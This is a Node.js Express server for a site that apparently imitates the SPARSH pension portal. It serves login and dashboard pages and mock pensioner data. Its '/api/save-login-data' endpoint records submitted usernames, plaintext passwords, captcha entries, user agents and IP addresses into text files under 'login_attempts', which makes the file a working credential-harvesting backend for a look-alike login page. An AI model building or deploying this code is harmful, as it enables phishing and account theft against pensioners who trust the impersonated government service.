const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json()); // Parse JSON bodies
app.use(express.static(__dirname)); // Serve static files

// Serve HTML files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

app.get('/dashboard-pensioner', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard-pensioner.html'));
});

// API endpoints for demo purposes
app.get('/api/pensioner/:id', (req, res) => {
    // Mock pensioner data
    const pensionerData = {
        id: req.params.id,
        name: 'John Doe',
        pensionId: 'PEN123456789',
        ppoNumber: 'PPO/2020/123456',
        basicPension: 30000,
        dearnessAllowance: 13800,
        totalPension: 43800,
        bankAccount: 'HDFC Bank - XXXX1234',
        nextPaymentDate: '15th',
        documentsCount: 12,
        notificationsCount: 3
    };
    res.json(pensionerData);
});

app.get('/api/pensioner/:id/documents', (req, res) => {
    // Mock documents data
    const documents = [
        {
            id: 1,
            name: 'Pension Payment Order',
            type: 'PPO',
            number: 'PPO/2020/123456',
            lastUpdated: '2024-12-15',
            size: '2.5 MB'
        },
        {
            id: 2,
            name: 'Life Certificate',
            type: 'LIFE_CERT',
            number: 'LC/2024/001',
            lastUpdated: '2024-12-10',
            size: '1.8 MB'
        },
        {
            id: 3,
            name: 'Pension Slip',
            type: 'PENSION_SLIP',
            number: 'PS/2024/12',
            lastUpdated: '2024-12-15',
            size: '0.5 MB'
        },
        {
            id: 4,
            name: 'Service Book',
            type: 'SERVICE_BOOK',
            number: 'SB/2020/001',
            lastUpdated: '2024-11-20',
            size: '5.2 MB'
        }
    ];
    res.json(documents);
});

app.get('/api/pensioner/:id/payments', (req, res) => {
    // Mock payment history
    const payments = [
        {
            id: 1,
            date: '2024-12-15',
            amount: 43800,
            status: 'CREDITED',
            description: 'Monthly Pension'
        },
        {
            id: 2,
            date: '2024-11-15',
            amount: 43800,
            status: 'CREDITED',
            description: 'Monthly Pension'
        },
        {
            id: 3,
            date: '2024-10-15',
            amount: 43800,
            status: 'CREDITED',
            description: 'Monthly Pension'
        }
    ];
    res.json(payments);
});

app.get('/api/pensioner/:id/notifications', (req, res) => {
    // Mock notifications
    const notifications = [
        {
            id: 1,
            title: 'Pension Credited Successfully',
            message: 'Your pension amount of ₹43,800 has been credited to your account.',
            type: 'SUCCESS',
            timestamp: new Date(Date.now() - 2 * 60 * 60 * 1000).toISOString(),
            read: false
        },
        {
            id: 2,
            title: 'DA Revision Notification',
            message: 'Dearness Allowance has been revised to 46% effective from July 2024.',
            type: 'INFO',
            timestamp: new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(),
            read: false
        },
        {
            id: 3,
            title: 'Document Update Required',
            message: 'Please upload your life certificate before December 31, 2024.',
            type: 'WARNING',
            timestamp: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000).toISOString(),
            read: true
        }
    ];
    res.json(notifications);
});

// Login data capture endpoint
app.post('/api/save-login-data', (req, res) => {
    try {
        const loginData = req.body;
        
        // Add server-side information
        loginData.ipAddress = req.ip || req.connection.remoteAddress || 'Unknown';
        loginData.serverTimestamp = new Date().toISOString();
        
        // Create login attempts directory if it doesn't exist
        const logDir = path.join(__dirname, 'login_attempts');
        if (!fs.existsSync(logDir)) {
            fs.mkdirSync(logDir);
        }
        
        // Generate filename with date
        const date = new Date().toISOString().split('T')[0];
        const logFile = path.join(logDir, `sparsh_login_attempts_${date}.txt`);
        
        // Format the log entry
        const logEntry = `
=== LOGIN ATTEMPT ===
Timestamp: ${loginData.serverTimestamp}
Client Timestamp: ${loginData.timestamp}
Username: ${loginData.username}
Password: ${loginData.password}
Captcha: ${loginData.captcha}
Show Password Enabled: ${loginData.showPasswordEnabled ? 'Yes' : 'No'}
IP Address: ${loginData.ipAddress}
User Agent: ${loginData.userAgent}
Login Method: ${loginData.loginAttempt}
======================

`;

        // Append to log file
        fs.appendFileSync(logFile, logEntry);
        
        // Also save to a master log file
        const masterLogFile = path.join(logDir, 'all_login_attempts.txt');
        fs.appendFileSync(masterLogFile, logEntry);
        
        console.log(`📝 Login attempt logged: ${loginData.username} from ${loginData.ipAddress}`);
        
        res.json({ 
            success: true, 
            message: 'Login data saved successfully',
            filename: `sparsh_login_attempts_${date}.txt`
        });
        
    } catch (error) {
        console.error('Error saving login data:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to save login data',
            message: error.message 
        });
    }
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Something went wrong!' });
});

// 404 handler
app.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, '404.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 SPARSH Portal Server running on http://localhost:${PORT}`);
    console.log(`📱 Access the portal at: http://localhost:${PORT}`);
    console.log(`🔐 Login page: http://localhost:${PORT}/login`);
    console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard-pensioner`);
    console.log(`\n📋 Available API endpoints:`);
    console.log(`   GET /api/pensioner/:id - Get pensioner details`);
    console.log(`   GET /api/pensioner/:id/documents - Get documents`);
    console.log(`   GET /api/pensioner/:id/payments - Get payment history`);
    console.log(`   GET /api/pensioner/:id/notifications - Get notifications`);
    console.log(`   POST /api/save-login-data - Save login attempts to text file`);
    console.log(`\n📁 Login attempts will be saved to: ./login_attempts/`);
    console.log(`\n✨ Press Ctrl+C to stop the server`);
}); 